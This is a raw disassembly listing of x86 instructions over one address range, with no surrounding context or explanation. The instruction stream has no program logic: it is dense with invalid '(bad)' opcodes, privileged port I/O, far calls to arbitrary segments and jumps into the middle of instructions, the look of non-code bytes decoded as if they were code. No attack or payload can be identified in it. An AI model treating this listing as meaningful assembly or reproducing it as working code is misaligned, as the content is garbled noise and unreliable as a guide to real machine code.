  42078e:	rol    BYTE PTR [ecx-0x42aefa4e],1
  420794:	js     0x4207ff
  420796:	inc    ebx
  420797:	jp     0x4207ab
  420799:	jo     0x420764
  42079b:	test   eax,0x95e09607
  4207a0:	xchg   edx,eax
  4207a1:	std    
  4207a2:	dec    edi
  4207a3:	push   cs
  4207a4:	(bad)  
  4207a5:	xor    BYTE PTR [edx-0x6e3e3538],bl
  4207ab:	push   0x54
  4207ad:	(bad)  
  4207ae:	mov    ds:0x83c910a4,eax
  4207b3:	mov    cl,0x6
  4207b5:	fild   DWORD PTR [edx]
  4207b7:	or     dl,BYTE PTR [ebp+0x3d]
  4207ba:	sub    dl,bh
  4207bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207bd:	inc    edx
  4207be:	outs   dx,BYTE PTR ds:[esi]
  4207bf:	or     al,0xad
  4207c1:	push   0x20
  4207c3:	daa    
  4207c4:	or     bl,BYTE PTR [ecx+0x15]
  4207c7:	add    esi,ebx
  4207c9:	jbe    0x420847
  4207cb:	cdq    
  4207cc:	mov    al,0xd3
  4207ce:	popf   
  4207cf:	add    al,BYTE PTR [eax-0x9]
  4207d2:	lea    ebx,[ecx+0x12]
  4207d5:	out    dx,eax
  4207d6:	addr16 xor al,0x4c
  4207d9:	mov    eax,0x5bdd99a
  4207de:	sub    BYTE PTR [ebp-0x146831d3],ah
  4207e4:	sub    esi,ecx
  4207e6:	lahf   
  4207e7:	clc    
  4207e8:	push   es
  4207e9:	push   ds
  4207ea:	pop    eax
  4207eb:	addr16 push edi
  4207ed:	(bad)  
  4207ee:	retf   
  4207ef:	(bad)  
  4207f0:	lods   eax,DWORD PTR ds:[esi]
  4207f1:	pop    ds
  4207f2:	mov    esp,0x8a23f20b
  4207f7:	adc    esi,edi
  4207f9:	jecxz  0x420798
  4207fb:	test   eax,0x5de9417e
  420800:	xchg   edx,eax
  420801:	outs   dx,DWORD PTR ds:[esi]
  420802:	jg     0x42086e
  420804:	cmp    bl,cl
  420806:	call   0xd11b:0x52900cef
  42080d:	jmp    FWORD PTR [eax-0x59]
  420810:	jge    0x420862
  420812:	daa    
  420813:	fwait
  420814:	ss int3 
  420816:	mov    dl,0x90
  420818:	push   eax
  420819:	lea    ecx,[ecx-0x65d2dfa6]
  42081f:	mov    dh,0x8a
  420821:	(bad)  
  420822:	neg    DWORD PTR [ebp-0x5f7964cf]
  420828:	push   ecx
  420829:	xchg   ebp,eax
  42082a:	mov    ds:0x4acb22ed,eax
  42082f:	fstp   DWORD PTR [esi+0x70]
  420832:	popf   
  420833:	push   ss
  420834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420835:	ins    BYTE PTR es:[edi],dx
  420836:	cdq    
  420837:	rcl    BYTE PTR [edx-0x42660eee],1
  42083d:	jo     0x420883
  42083f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420840:	pop    edi
  420841:	les    ecx,FWORD PTR [edx+0x39]
  420844:	xor    BYTE PTR [esi+eiz*1],bh
  420847:	scas   eax,DWORD PTR es:[edi]
  420848:	mov    dl,0xa9
  42084a:	or     BYTE PTR [eax+eiz*2-0x77f6cce5],bh
  420851:	push   ss
  420852:	jmp    esp
  420854:	mov    eax,ds:0x25861ab0
  420859:	cmp    dh,BYTE PTR [eax]
  42085b:	fdiv   DWORD PTR [ebx+edi*8]
  42085e:	jbe    0x420837
  420860:	mov    bl,BYTE PTR [ebx+edi*8+0x20]
  420864:	lahf   
  420865:	push   es
  420866:	dec    eax
  420867:	arpl   dx,dx
  420869:	mov    esi,0xb84ba4c
  42086e:	sub    bl,BYTE PTR [edx-0x23]
  420871:	in     eax,dx
  420872:	adc    esi,DWORD PTR [edi]
  420874:	mov    bh,0x27
  420876:	call   0xb820:0xb4d8ae66
  42087d:	add    BYTE PTR [edi+ebx*2-0x1af4f41e],ah
  420884:	addr16 ret 
  420886:	xor    al,0x1d
  420888:	or     eax,0xdbba9a95
  42088d:	sbb    edx,ebx
  42088f:	les    ebx,FWORD PTR [edi]
  420891:	aam    0x7c
  420893:	push   ecx
  420894:	pop    esi
  420895:	push   ss
  420896:	adc    eax,0xeb0b7f4f
  42089b:	(bad)  
  42089d:	and    eax,ecx
  42089f:	mov    cl,0xb2
  4208a1:	jns    0x4208a8
  4208a3:	leave  
  4208a4:	vaddsubpd xmm1,xmm6,xmm5
  4208a8:	or     al,0xb
  4208aa:	and    eax,0xd9c705ab
  4208af:	or     esp,esi
  4208b1:	and    BYTE PTR [edx+0x1aaf3c1f],bl
  4208b7:	(bad)  
  4208b8:	pop    ebx
  4208b9:	aas    
  4208ba:	xchg   BYTE PTR [edi-0x5fde8e95],ah
  4208c0:	ror    cl,1
  4208c2:	lods   eax,DWORD PTR ds:[esi]
  4208c3:	pop    ebx
  4208c4:	mov    esp,0x28526488
  4208c9:	or     edi,esp
  4208cb:	inc    esp
  4208cc:	mov    ds:0x67a7be95,eax
  4208d1:	fst    DWORD PTR [ecx]
  4208d3:	imul   edx,DWORD PTR [ebx+0x4cf7efb6],0x91909475
  4208dd:	in     al,0x16
  4208df:	out    0x65,eax
  4208e1:	fbstp  TBYTE PTR [esi-0x2ff46dc9]
  4208e7:	cld    
  4208e8:	in     al,0x5a
  4208ea:	test   BYTE PTR [edx],0xd
  4208ed:	mov    eax,0x98e58d99
  4208f2:	push   ss
  4208f3:	xchg   esi,eax
  4208f4:	inc    ebp
  4208f5:	jmp    0x4208cb
  4208f7:	jbe    0x420892
  4208f9:	or     edi,DWORD PTR [ecx+0x3e5636a3]
  4208ff:	and    eax,0x109a5219
  420904:	test   al,0x4a
  420906:	nop
  420907:	xchg   ecx,eax
  420908:	inc    esi
  420909:	or     al,0x59
  42090b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42090c:	clc    
  42090d:	lock xchg esi,eax
  42090f:	cwde   
  420910:	sub    DWORD PTR [edi],edx
  420912:	fstp   DWORD PTR [ebx]
  420914:	mov    dl,0x12
  420916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420917:	fmul   QWORD PTR [eax-0x20]
  42091a:	ffree  st(0)
  42091c:	iret   
  42091d:	or     eax,DWORD PTR [ebp+0x78bb233a]
  420923:	mov    ds:0x319bbd01,al
  420928:	gs gs in al,0xcb
  42092c:	mov    esi,0x16485a0d
  420931:	sbb    eax,0xbcbea80
  420936:	mov    eax,DWORD PTR [ebx+eiz*8]
  420939:	inc    ecx
  42093a:	push   0x6b
  42093c:	mov    ebp,0x1bf1217c
  420941:	or     DWORD PTR [ebp+0x2eeb51bf],esp
  420947:	imul   ecx,DWORD PTR [edi+0x43814f0b],0xeb85e753
  420951:	ds in  eax,0xc5
  420954:	mov    dl,0xaf
  420956:	adc    al,0xc2
  420958:	sbb    bh,al
  42095a:	ins    BYTE PTR es:[edi],dx
  42095b:	shl    DWORD PTR [ebx+0x69610c0b],0xbd
  420962:	leave  
  420963:	and    al,0x72
  420965:	adc    DWORD PTR [edx+0x334ad52c],ebx
  42096b:	bound  edi,QWORD PTR ds:0xeaa7669a
  420971:	and    al,0x85
  420973:	dec    edx
  420974:	mov    ah,0x97
  420976:	enter  0xbd1b,0xaa
  42097a:	dec    edx
  42097b:	mov    ds:0xc333c88b,eax
  420980:	nop
  420981:	stos   DWORD PTR es:[edi],eax
  420982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420983:	cmp    BYTE PTR [ebx+ecx*1-0x8],ch
  420987:	jno    0x420942
  420989:	ror    BYTE PTR [ecx-0x4138bc53],1
  42098f:	test   eax,0xe59ac20e
  420994:	jmp    0xc4725938
  420999:	imul   esp,DWORD PTR [edi],0x7
  42099c:	adc    DWORD PTR [esi+0x2eb28166],0x2991b3e5
  4209a6:	sub    eax,0x5f165e31
  4209ab:	in     al,dx
  4209ac:	dec    ebx
  4209ad:	int3   
  4209ae:	hlt    
  4209af:	pop    edi
  4209b0:	ss stos DWORD PTR es:[edi],eax
  4209b2:	fidivr WORD PTR [edi+0x34]
  4209b5:	add    BYTE PTR [edx+0xbec9320],bl
  4209bb:	test   eax,0xa91f802f
  4209c0:	mov    al,ds:0xd2876ab3
  4209c5:	inc    ecx
  4209c6:	mov    ebp,cs
  4209c8:	dec    ebx
  4209c9:	loopne 0x420966
  4209cb:	lods   eax,DWORD PTR ds:[esi]
  4209cc:	scas   eax,DWORD PTR es:[edi]
  4209cd:	xchg   DWORD PTR [eax],ebx
  4209cf:	shl    DWORD PTR [esi+0x3d744678],0xb
  4209d6:	imul   ecx,DWORD PTR [ecx+0x1a413ad1],0xffffffe0
  4209dd:	mov    bl,BYTE PTR [edx-0x678c7a67]
  4209e3:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4209e5:	and    DWORD PTR [esp+eiz*4],edx
  4209e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209e9:	ja     0x4209cb
  4209eb:	into   
  4209ec:	fwait
  4209ed:	enter  0x541a,0xc1
  4209f1:	mov    ecx,0xcff9d198
  4209f6:	icebp  
  4209f7:	call   0x21d255d0
  4209fc:	hlt    
  4209fd:	or     eax,DWORD PTR [edi+0x38]
  420a00:	cmp    dh,dl
  420a02:	(bad)  
  420a03:	ja     0x420a0b
  420a05:	fwait
  420a06:	cwde   
  420a07:	pop    ebx
  420a08:	mov    eax,0x283f2534
  420a0d:	retf   
  420a0e:	xlat   BYTE PTR ds:[ebx]
  420a0f:	push   0x1a2d0b85
  420a14:	adc    dh,BYTE PTR [ebp-0x48]
  420a17:	daa    
  420a18:	jmp    0xe1e2:0xf9359acb
  420a1f:	xor    DWORD PTR [edi+0x6ed45d2c],esp
  420a25:	ss hlt 
  420a27:	int    0xb3
  420a29:	push   es
  420a2a:	popa   
  420a2b:	sahf   
  420a2c:	dec    esp
  420a2d:	push   ebp
  420a2e:	jbe    0x420aab
  420a30:	jnp    0x420a7b
  420a32:	call   0x2af7:0x4cd6d3e8
  420a39:	int    0xe9
  420a3b:	fwait
  420a3c:	adc    BYTE PTR [edx+ebx*1],dl
  420a3f:	lock cmp al,0x52
  420a42:	jl     0x420a69
  420a44:	mov    cl,0xb7
  420a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a47:	cli    
  420a48:	ins    BYTE PTR es:[edi],dx
  420a49:	xchg   esi,eax
  420a4a:	rol    DWORD PTR [edi-0x7325070e],1
  420a50:	add    BYTE PTR [ebx+ebp*1],dh
  420a53:	mov    al,ds:0x5e6513f5
  420a58:	dec    edi
  420a59:	fwait
  420a5a:	add    al,0xdd
  420a5c:	push   ebp
  420a5d:	test   DWORD PTR [ebp-0x51749a37],esp
  420a63:	test   eax,0xa6a72aa8
  420a68:	ins    BYTE PTR es:[edi],dx
  420a69:	xor    al,0x38
  420a6b:	mov    ds:0x60d80b49,eax
  420a70:	add    ah,ch
  420a72:	jno    0x420a41
  420a74:	xor    al,0x8
  420a76:	call   0x6b6:0xd1c5e33a
  420a7d:	test   DWORD PTR [ebp-0x59],esp
  420a80:	data16 mov BYTE PTR [ebx-0x122f8093],ah
  420a87:	arpl   WORD PTR [edx+0x6d],ax
  420a8a:	call   0x9300:0xc6ff594e
  420a91:	add    BYTE PTR [ebx+0xb210ba6],0xf2
  420a98:	in     eax,dx
  420a99:	js     0x420b11
  420a9b:	push   ebx
  420a9c:	dec    esi
  420a9d:	or     al,0x9a
  420a9f:	lods   al,BYTE PTR ds:[esi]
  420aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aa1:	out    dx,eax
  420aa2:	enter  0xa384,0x9
  420aa6:	scas   al,BYTE PTR es:[edi]
  420aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420aa8:	xchg   esi,eax
  420aa9:	adc    al,0x75
  420aab:	repz push ss
  420aad:	jbe    0x420b0d
  420aaf:	addr16 int 0x2c
  420ab2:	call   0xe0d4:0x230e98df
  420ab9:	pop    ebp
  420aba:	ins    DWORD PTR es:[edi],dx
  420abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420abc:	lods   eax,DWORD PTR ds:[esi]
  420abd:	sub    BYTE PTR [edx+0x41673c59],0x53
  420ac4:	mov    dl,0xc4
  420ac6:	sub    cl,ch
  420ac8:	stos   BYTE PTR es:[edi],al
  420ac9:	js     0x420a64
  420acb:	test   eax,0xf3330b71
  420ad0:	add    esi,DWORD PTR [edx]
  420ad2:	or     eax,0x9a002076
  420ad7:	outs   dx,DWORD PTR ds:[esi]
  420ad8:	mov    ebp,0xa348156b
  420add:	mov    cl,0xf4
  420adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ae0:	das    
  420ae1:	or     BYTE PTR [edx+0x12],bl
  420ae4:	lods   eax,DWORD PTR ds:[esi]
  420ae5:	push   ds
  420ae6:	mov    edx,0x9a931a73
  420aeb:	mov    bh,0x10
  420aed:	xchg   esp,eax
  420aee:	sbb    bl,BYTE PTR [esi]
  420af0:	call   0x181d:0x51a7b985
  420af7:	mov    ch,0x9
  420af9:	lds    edx,FWORD PTR [esi]
  420afb:	sbb    ebp,DWORD PTR [edi-0xac688e0]
  420b01:	mov    al,BYTE PTR [ecx-0x6bebadb5]
  420b07:	xchg   edi,eax
  420b08:	ud2    
  420b0a:	push   edx
  420b0b:	lods   al,BYTE PTR ds:[esi]
  420b0c:	data16 in al,dx
  420b0e:	hlt    
  420b0f:	adc    eax,0x3499979d
  420b14:	sbb    al,BYTE PTR [esi+0x1a]
  420b17:	arpl   WORD PTR [ecx-0x5d],dx
  420b1a:	popf   
  420b1b:	call   0x1535:0xe1eb0b33
  420b22:	xor    eax,0x9ad7e0af
  420b27:	int    0x7a
  420b29:	or     DWORD PTR [edx+0x2900eece],edi
  420b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b30:	inc    edx
  420b31:	pop    ebp
  420b32:	dec    esp
  420b33:	aas    
  420b34:	in     al,dx
  420b35:	addr16 call 0xbee4:0x3723faf5
  420b3d:	mov    ch,0x7f
  420b3f:	popf   
  420b40:	shr    ebp,0x1a
  420b43:	cmp    al,0x2f
  420b45:	scas   eax,DWORD PTR es:[edi]
  420b46:	test   DWORD PTR [edi],esi
  420b48:	outs   dx,DWORD PTR ds:[esi]
  420b49:	cmp    al,0xec
  420b4b:	div    DWORD PTR [edx+0x6931976f]
  420b51:	outs   dx,BYTE PTR ds:[esi]
  420b52:	push   es
  420b53:	cmp    DWORD PTR [ebx-0x1e43a5f5],eax
  420b59:	add    al,0xa4
  420b5b:	adc    eax,0xff9d31cd
  420b60:	dec    edi
  420b61:	or     edi,0x31
  420b64:	push   ebx
  420b65:	jg     0x420af0
  420b67:	ficom  WORD PTR [esi-0x2e]
  420b6a:	lahf   
  420b6b:	test   al,0x30
  420b6d:	retf   0xf331
  420b70:	cmp    eax,0xba0b3aa5
  420b75:	pop    es
  420b76:	data16 (bad) 
  420b78:	mov    dl,0xdb
  420b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b7b:	fs pop ecx
  420b7d:	mov    bl,dl
  420b7f:	imul   esi,DWORD PTR [edi+0xb],0xb338ae9c
  420b86:	push   ebx
  420b87:	clc    
  420b88:	jb     0x420b6c
  420b8a:	call   0x4b47:0x5685ab98
  420b91:	mov    dh,0xf5
  420b93:	mov    ecx,0x3b3a7259
  420b98:	sub    eax,0x642130cb
  420b9d:	add    al,0x89
  420b9f:	std    
  420ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ba1:	xor    al,0x4b
  420ba3:	or     BYTE PTR [edi],cl
  420ba5:	jno    0x420b48
  420ba7:	sub    eax,0x83498b54
  420bac:	pop    ebp
  420bad:	inc    edx
  420bae:	fsub   st,st(1)
  420bb0:	xor    ecx,DWORD PTR [ebx]
  420bb2:	out    dx,al
  420bb3:	jb     0x420b8a
  420bb5:	sub    edi,eax
  420bb7:	icebp  
  420bb8:	adc    ch,BYTE PTR [esi-0x66]
  420bbb:	xchg   esp,eax
  420bbc:	stc    
  420bbd:	je     0x420c16
  420bbf:	xor    al,0xd9
  420bc1:	lock and ebx,DWORD PTR [ebx+0x1c1d22f8]
  420bc8:	stos   BYTE PTR es:[edi],al
  420bc9:	push   cs
  420bca:	add    dl,BYTE PTR [eax]
  420bcc:	js     0x420c36
  420bce:	imul   esi,DWORD PTR [ebx+0x23977672],0xffffffb2
  420bd5:	pmaxub mm7,QWORD PTR [eax+esi*1]
  420bd9:	sbb    eax,0xbb89ada
  420bde:	test   al,0xba
  420be0:	cld    
  420be1:	out    dx,al
  420be2:	xchg   ecx,eax
  420be3:	std    
  420be4:	das    
  420be5:	push   esp
  420be6:	call   0x5849:0x50c4ad1d
  420bed:	fdivr  QWORD PTR [edi+0xdc926a7]
  420bf3:	cdq    
  420bf4:	dec    DWORD PTR [ecx+0x7]
  420bf7:	or     DWORD PTR [edi-0x60d85152],ecx
  420bfd:	mov    WORD PTR [ecx+0x24e57194],es
  420c03:	test   al,0x90
  420c05:	and    DWORD PTR [esi],ebx
  420c07:	xor    BYTE PTR [edx+0x577b9ea8],0x39
  420c0e:	out    0x3c,al
  420c10:	dec    eax
  420c11:	xchg   DWORD PTR [edx-0x558d85ca],ebx
  420c17:	mov    dl,0xe4
  420c19:	bound  esi,QWORD PTR [edx+0x4409bbb8]
  420c1f:	sub    BYTE PTR [esi-0x4e],dh
  420c22:	je     0x420bb9
  420c24:	xor    bl,BYTE PTR [eax+0xd]
  420c27:	push   ss
  420c28:	les    edi,FWORD PTR [edx-0x66]
  420c2b:	ret    
  420c2c:	mov    ds:0x8d718cb3,al
  420c31:	xor    edx,edx
  420c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c34:	jle    0x420c00
  420c36:	les    eax,FWORD PTR [edx+ecx*8]
  420c39:	dec    esp
  420c3a:	jp     0x420bd3
  420c3c:	inc    BYTE PTR [edi]
  420c3e:	call   0x4137:0xda8906ff
  420c45:	xchg   ebp,eax
  420c46:	jp     0x420bed
  420c48:	push   esi
  420c49:	int3   
  420c4a:	mov    edi,0x5a3ee85b
  420c4f:	test   eax,0xeae72d76
  420c54:	mov    cl,0xa4
  420c56:	or     al,0x5e
  420c58:	or     esp,edi
  420c5a:	test   BYTE PTR [edi-0x19],ah
  420c5d:	jge    0x420c5f
  420c5f:	fdiv   st,st(3)
  420c61:	or     esi,DWORD PTR [ebp+0x19]
  420c64:	out    0x2c,al
  420c66:	loope  0x420c63
  420c68:	push   esp
  420c69:	retf   0xa49a
  420c6c:	jo     0x420c31
  420c6e:	mov    esi,0x27d9b48a
  420c73:	test   al,0x51
  420c75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c76:	stc    
  420c77:	pop    es
  420c78:	jb     0x420c4e
  420c7a:	cmc    
  420c7b:	aas    
  420c7c:	adc    esi,esi
  420c7e:	popf   
  420c7f:	and    al,bl
  420c81:	push   cs
  420c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c83:	mov    ebp,0x856ff292
  420c88:	retf   
  420c89:	or     esi,DWORD PTR [eax+0x49cb20af]
  420c8f:	test   eax,0x96934cc5
  420c94:	sbb    ebx,DWORD PTR [ebp+0x56d027a3]
  420c9a:	scas   eax,DWORD PTR es:[edi]
  420c9b:	mov    bh,0x2a
  420c9d:	or     dl,BYTE PTR [ecx+0x4b7f5c85]
  420ca3:	stos   DWORD PTR es:[edi],eax
  420ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ca5:	fcmovne st,st(7)
  420ca7:	xchg   edi,eax
  420ca8:	mov    dl,0x1c
  420caa:	cwde   
  420cab:	and    al,0x9d
  420cad:	ins    BYTE PTR es:[edi],dx
  420cae:	in     eax,0xd
  420cb0:	adc    eax,0x39bb0f0b
  420cb5:	mov    ds:0xeeb7040b,al
  420cba:	call   0x26e7:0xd8b52814
  420cc1:	inc    ecx
  420cc2:	inc    edx
  420cc3:	pop    ds
  420cc4:	fimul  WORD PTR [ebx]
  420cc6:	pop    ss
  420cc7:	xchg   ebx,eax
  420cc8:	bound  edi,QWORD PTR [ecx+0x3736039d]
  420cce:	test   eax,eax
  420cd0:	or     BYTE PTR [eax-0x66],dh
  420cd3:	push   esi
  420cd4:	push   cs
  420cd5:	or     ch,BYTE PTR [ebx]
  420cd7:	iret   
  420cd8:	cmp    cl,BYTE PTR [ebx]
  420cda:	cmpps  xmm7,xmm7,0xfc
  420cde:	xchg   esi,eax
  420cdf:	adc    eax,0x6e9a7753
  420ce4:	pop    ebp
  420ce5:	int3   
  420ce6:	loop   0x420cac
  420ce8:	fcos   
  420cea:	adc    ebx,ebx
  420cec:	adc    ecx,DWORD PTR [ebx]
  420cee:	(bad)  
  420cef:	mov    ch,0x47
  420cf1:	imul   ecx,DWORD PTR [ecx+0x12],0x7c
  420cf5:	sbb    esp,DWORD PTR [esi-0x67e25c4f]
  420cfb:	and    dh,BYTE PTR [edx-0x378d3232]
  420d01:	jne    0x420d63
  420d03:	mov    al,ds:0x8389c3a
  420d08:	daa    
  420d09:	test   al,0x5b
  420d0b:	std    
  420d0c:	and    cl,cl
  420d0e:	inc    ecx
  420d0f:	push   0xffffff8a
  420d11:	div    ah
  420d13:	pop    ds
  420d14:	pusha  
  420d15:	(bad)  
  420d16:	sbb    DWORD PTR [edi+0x238f17ec],esp
  420d1c:	push   ecx
  420d1d:	and    esp,DWORD PTR es:[edi+0xfb83206]
  420d24:	shld   ebx,ebp,0xa0
  420d28:	int    0x19
  420d2a:	call   0xb7b6:0xa96f0a3d
  420d31:	jl     0x420cf4
  420d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d34:	fsub   QWORD PTR [edx+edx*4]
  420d37:	push   ebp
  420d38:	int    0xfb
  420d3a:	out    dx,eax
  420d3b:	mov    dl,0x40
  420d3d:	inc    edx
  420d3e:	je     0x420da0
  420d40:	mov    dl,0x1f
  420d42:	jmp    0x834439fb
  420d47:	or     al,0x4b
  420d49:	or     ebx,DWORD PTR [ebx]
  420d4b:	mov    edi,0x9670906
  420d50:	and    dh,bl
  420d52:	call   0x7f82:0x78e60057
  420d59:	pusha  
  420d5a:	xor    BYTE PTR [edi-0x121d6e58],ah
  420d60:	ret    0x8e34
  420d63:	call   0x7c111e1a
  420d68:	in     al,dx
  420d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d6a:	retf   
  420d6b:	enter  0x1661,0x76
  420d6f:	inc    eax
  420d70:	jns    0x420cfd
  420d72:	js     0x420dcb
  420d74:	mov    cs,WORD PTR [eax+0x5]
  420d77:	mov    esi,DWORD PTR [edx-0xdfd9349]
  420d7d:	mov    ds:0xb19f13d,eax
  420d82:	xor    al,0x1
  420d84:	ins    BYTE PTR es:[edi],dx
  420d85:	dec    edi
  420d86:	fs sbb cl,0x18
  420d8a:	call   0xb44b:0x7d417b03
  420d91:	push   esi
  420d92:	retf   0x3b9d
  420d95:	add    DWORD PTR [edx],ebx
  420d97:	add    al,0xa5
  420d9a:	add    ah,BYTE PTR [eax-0x3812a351]
  420da0:	mov    dl,0x32
  420da2:	inc    esp
  420da3:	outs   dx,DWORD PTR ds:[esi]
  420da4:	shr    DWORD PTR [ebp+ebp*8-0x7],0x4c
  420da9:	cmc    
  420daa:	cdq    
  420dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dac:	cmp    bh,BYTE PTR [esp+edi*2]
  420daf:	mov    ch,0xa3
  420db1:	fmul   QWORD PTR [edx+eiz*4]
  420db4:	mov    dl,0x5e
  420db6:	xor    DWORD PTR [edx],ebx
  420db8:	lock lods al,BYTE PTR ds:[esi]
  420dba:	dec    edx
  420dbb:	mov    esi,0x1e4e0bfd
  420dc0:	outs   dx,DWORD PTR ds:[esi]
  420dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dc2:	push   0xfffffffb
  420dc4:	or     esi,0xa145b9a
  420dca:	push   esp
  420dcb:	sub    eax,0xd7ee9096
  420dd0:	rcl    DWORD PTR ds:0x8b459543,1
  420dd6:	das    
  420dd7:	sub    DWORD PTR [ebp-0x4d593a1c],eax
  420ddd:	sar    DWORD PTR ds:[ecx],cl
  420de0:	inc    esp
  420de1:	jno    0x420e21
  420de3:	leave  
  420de4:	fsubrp st(3),st
  420de6:	int3   
  420de7:	scas   al,BYTE PTR es:[edi]
  420de8:	out    dx,al
  420de9:	fwait
  420dea:	popf   
  420deb:	xor    DWORD PTR [edx],esi
  420ded:	lahf   
  420dee:	jl     0x420d78
  420df0:	adc    dh,0x87
  420df3:	out    0xcc,eax
  420df5:	shl    BYTE PTR [edi+0x73485727],1
  420dfb:	iret   
  420dfc:	jmp    0x420e43
  420dfe:	int3   
  420dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e00:	jns    0x420e3f
  420e02:	arpl   WORD PTR [ebx-0x1f],bx
  420e05:	or     bh,BYTE PTR [edx-0x7a]
  420e08:	in     eax,dx
  420e09:	ja     0x420df2
  420e0b:	and    BYTE PTR [eax-0x4d334ed4],0xdf
  420e12:	mov    ah,BYTE PTR [eax-0x58c9acbb]
  420e18:	ret    0x207c
  420e1b:	(bad)  
  420e1c:	mov    dh,0x4e
  420e1e:	push   ss
  420e1f:	sbb    al,0xb2
  420e21:	mov    esp,cs
  420e23:	push   es
  420e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e25:	push   ds
  420e26:	adc    al,bh
  420e28:	dec    edi
  420e29:	or     esp,edi
  420e2b:	xor    DWORD PTR es:[esi+edi*1-0x65cc5056],esp
  420e33:	mov    al,ds:0xcbafd225
  420e38:	out    0x98,al
  420e3a:	jg     0x420de3
  420e3c:	jmp    0x38f5:0x962f23aa
  420e43:	loopne 0x420df7
  420e45:	mov    al,0x85
  420e47:	sar    BYTE PTR [esi],cl
  420e49:	ror    ch,1
  420e4b:	cmp    edx,DWORD PTR [esi]
  420e4d:	or     ecx,DWORD PTR [ebp-0x611898a1]
  420e53:	in     eax,dx
  420e54:	mov    esp,0x73379aa8
  420e59:	jnp    0x420e40
  420e5b:	mov    gs:0x6da6de11,eax
  420e61:	outs   dx,DWORD PTR ds:[esi]
  420e62:	mov    ecx,cs
  420e64:	jno    0x420e5e
  420e66:	xchg   ecx,eax
  420e67:	out    0x1,eax
  420e69:	aaa    
  420e6a:	add    al,0xbf
  420e6c:	mov    dl,0xa4
  420e6e:	pop    DWORD PTR [edi+0x57]
  420e71:	push   ebp
  420e72:	fisttp QWORD PTR [edx]
  420e74:	pop    edi
  420e75:	add    BYTE PTR [esp+ecx*2],ah
  420e78:	inc    edx
  420e79:	sahf   
  420e7a:	call   0xb2db:0xc13dffb0
  420e81:	cld    
  420e82:	add    cl,cl
  420e84:	mov    ebx,ebp
  420e86:	aaa    
  420e87:	aaa    
  420e88:	pop    edi
  420e89:	or     esp,DWORD PTR [ebp+0x65674a2]
  420e8f:	mov    esp,0xd79a06f2
  420e94:	ss push ebx
  420e96:	lds    ebx,FWORD PTR [eax+ebp*4]
  420e99:	xor    eax,0xa8fc8b7d
  420e9e:	or     esp,DWORD PTR [edi+0x5f688c9e]
  420ea4:	push   0x6e
  420ea6:	call   0x50c:0x2f286373
  420ead:	dec    ecx
  420eae:	and    DWORD PTR [edi+0x6f0ef75c],0xffffffd8
  420eb5:	mov    eax,0x138cfc16
  420eba:	mul    BYTE PTR [edi-0x3829b241]
  420ec0:	adc    al,0x6d
  420ec2:	add    esp,DWORD PTR [eax-0xf6bd88f]
  420ec8:	dec    eax
  420ec9:	pop    ebx
  420eca:	or     al,BYTE PTR [edx-0x1e]
  420ecd:	ficomp DWORD PTR [ebx-0x39cae253]
  420ed3:	cmc    
  420ed4:	lods   eax,DWORD PTR ds:[esi]
  420ed5:	push   ecx
  420ed6:	jge    0x420f2f
  420ed8:	jp     0x420e7a
  420eda:	(bad)  
  420edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420edc:	xor    dl,BYTE PTR [esi]
  420ede:	ja     0x420f59
  420ee0:	fnstcw WORD PTR [ebp-0x7c71a8ed]
  420ee6:	pop    eax
  420ee7:	daa    
  420ee8:	adc    cl,BYTE PTR [eax]
  420eea:	sar    DWORD PTR [ebp-0x3e],cl
  420eed:	aas    
  420eee:	scas   eax,DWORD PTR es:[edi]
  420eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ef0:	xor    BYTE PTR [edx],ch
  420ef2:	xor    ebp,edi
  420ef4:	and    dh,BYTE PTR [eax]
  420ef6:	aad    0xb9
  420ef8:	mov    dl,0xbe
  420efa:	push   ds
  420efb:	lods   eax,DWORD PTR ds:[esi]
  420efc:	push   ebx
  420efd:	bound  edi,QWORD PTR [ecx]
  420eff:	pop    ecx
  420f00:	fmul   QWORD PTR [ebx]
  420f02:	shl    al,1
  420f04:	mov    ds:0x1cd7a8e8,al
  420f09:	dec    esi
  420f0a:	call   0x96bd:0x40893b73
  420f11:	inc    esp
  420f12:	(bad)  
  420f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f14:	cs xchg edx,eax
  420f16:	add    BYTE PTR [edx+eiz*8],cl
  420f19:	xchg   DWORD PTR [ecx],ebp
  420f1b:	push   ds
  420f1c:	mov    dl,0xf7
  420f1e:	and    eax,0xe1de8ff3
  420f23:	mov    eax,ds:0x7e140b73
  420f28:	cwde   
  420f29:	mov    DWORD PTR [edi+esi*8],0x5570f01d
  420f30:	mov    dl,0x14
  420f32:	dec    ebp
  420f33:	leave  
  420f34:	xchg   ecx,eax
  420f35:	pop    edi
  420f36:	out    0xc2,al
  420f38:	mov    edx,0x8fa7dbb3
  420f3d:	dec    ecx
